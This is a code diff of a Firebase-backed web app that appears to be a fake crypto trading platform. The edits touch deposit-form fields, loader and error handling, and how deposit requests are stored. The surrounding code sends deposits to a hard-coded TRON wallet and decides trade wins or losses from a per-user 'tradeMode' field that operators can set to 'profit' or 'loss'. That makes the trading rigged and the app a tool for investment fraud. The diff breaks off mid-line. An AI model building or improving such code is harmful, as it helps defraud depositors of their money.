@@ -24,6 +24,7 @@
         .loader-spin { width: 35px; height: 35px; border: 3px solid #1a1f29; border-top: 3px solid #eab308; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         select option { background: #1a1f29; color: white; }
+
         .success-checkmark { width: 60px; height: 60px; margin: 0 auto; border: 3px solid #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .error-xmark { width: 60px; height: 60px; margin: 0 auto; border: 3px solid #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
     </style>
@@ -129,13 +130,13 @@
                 </div>
                 <button onclick="toDStep(3)" class="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase">I Have Paid</button>
             </div>
-            <div id="dStep3" class="hidden space-y-3">
+            <div id="dStep3" class="hidden space-y-3 text-left">
                 <input type="email" id="depEmail" placeholder="Email" class="auth-input">
-                <input type="text" id="depTg" placeholder="Telegram ID" class="auth-input">
+                <input type="text" id="depTg" placeholder="Telegram Id" class="auth-input">
                 <input type="text" id="depAccName" placeholder="Enter your Account Name" class="auth-input">
                 <input type="number" id="depSendAmt" placeholder="Enter your send amount" class="auth-input">
                 <input type="text" id="depTx" placeholder="Enter your Txid" class="auth-input">
-                <button onclick="submitFinalDep()" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl uppercase">Submit</button>
+                <button onclick="submitFinalDep()" class="w-full py-4 bg-blue-600 text-white font-black rounded-2xl uppercase mt-4">Submit</button>
             </div>
             <button onclick="hideM('depM')" class="mt-4 text-gray-500 text-[10px] font-bold uppercase">Cancel</button>
         </div>
@@ -184,7 +185,7 @@
 
         function copyWallet() { navigator.clipboard.writeText('TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM'); document.getElementById('copyBtn').innerText="COPIED!"; setTimeout(()=>document.getElementById('copyBtn').innerText="COPY",2000); }
 
-        // Loader Fix: Ensure it closes even if firebase takes time
+        // --- FIXED LOADER & AUTH LOGIC ---
         auth.onAuthStateChanged(user => {
             const loader = document.getElementById('loadingScreen');
             if(user) {
@@ -201,11 +202,14 @@
                         if(!chartLoaded) { loadChart('FX:EURUSD'); chartLoaded = true; }
                         loader.style.display = 'none';
                     } else {
-                        // User exists in Auth but not in Firestore yet
+                        // Agar Firestore doc nahi mila toh bhi loader hatao aur auth dikhao
                         loader.style.display = 'none';
                         document.getElementById('authSection').style.display = 'flex';
                     }
-                }, (err) => { loader.style.display = 'none'; });
+                }, (err) => { 
+                    loader.style.display = 'none'; 
+                    showError("Connection error. Please refresh.");
+                });
             } else { 
                 document.getElementById('authSection').style.display = 'flex'; 
                 document.getElementById('appTerminal').style.display = 'none'; 
@@ -232,19 +236,28 @@
         function toDStep(s) { document.getElementById('dStep1').classList.add('hidden'); document.getElementById('dStep2').classList.add('hidden'); document.getElementById('dStep3').classList.add('hidden'); document.getElementById('dStep'+s).classList.remove('hidden'); }
 
         async function submitFinalDep() {
-            const tx = document.getElementById('depTx').value, em = document.getElementById('depEmail').value, acc = document.getElementById('depAccName').value, samt = document.getElementById('depSendAmt').value;
-            if(!tx || !em || !acc || !samt) return showError("Fill all fields");
+            const em = document.getElementById('depEmail').value,
+                  tg = document.getElementById('depTg').value,
+                  an = document.getElementById('depAccName').value,
+                  sa = document.getElementById('depSendAmt').value,
+                  tx = document.getElementById('depTx').value,
+                  pkr = document.getElementById('depAmtInput').value;
+
+            if(!em || !an || !sa || !tx) return showError("Please fill all fields");
+            
             await db.collection('requests').add({ 
                 uid: auth.currentUser.uid, 
                 email: em, 
-                telegram: document.getElementById('depTg').value,
-                accountName: acc,
-                sendAmount: samt,
-                txid: tx, 
-                requestedPkr: document.getElementById('depAmtInput').value,
-                time: Date.now() 
+                telegram: tg, 
+                accountName: an,
+                sendAmount: sa,
+                txid: tx,
+                pkrAmount: pkr,
+                time: Date.now(),
+                status: 'pending'
             });
-            hideM('depM'); showSuccess("Sent", "Deposit will be verified soon.");
+            hideM('depM'); 
+            showSuccess("Submitted", "Your deposit is being verified.");
         }
 
         async function submitWit() {
@@ -273,6 +286,4 @@
             const m = userData.tradeMode || 'normal';
             let win = m === 'profit' ? true : (m === 'loss' ? false : Math.random() > 0.5);
             const p = amt * 1.82, box = document.getElementById('resultBox');
-            if(win) { await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) }); box.innerHTML = `<h2 class="text-green-500 font-black">PROFIT</h2><h1 class="text-4xl">+$${p.toFixed(2)}</h1>`; }
-            else { box.innerHTML = `<h2 class="text-red-500 font-black">LOSS</h2><h1 class="text-4xl">-$${amt.toFixed(2)}</h1>`; }
-          
+            if(win) { await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.f
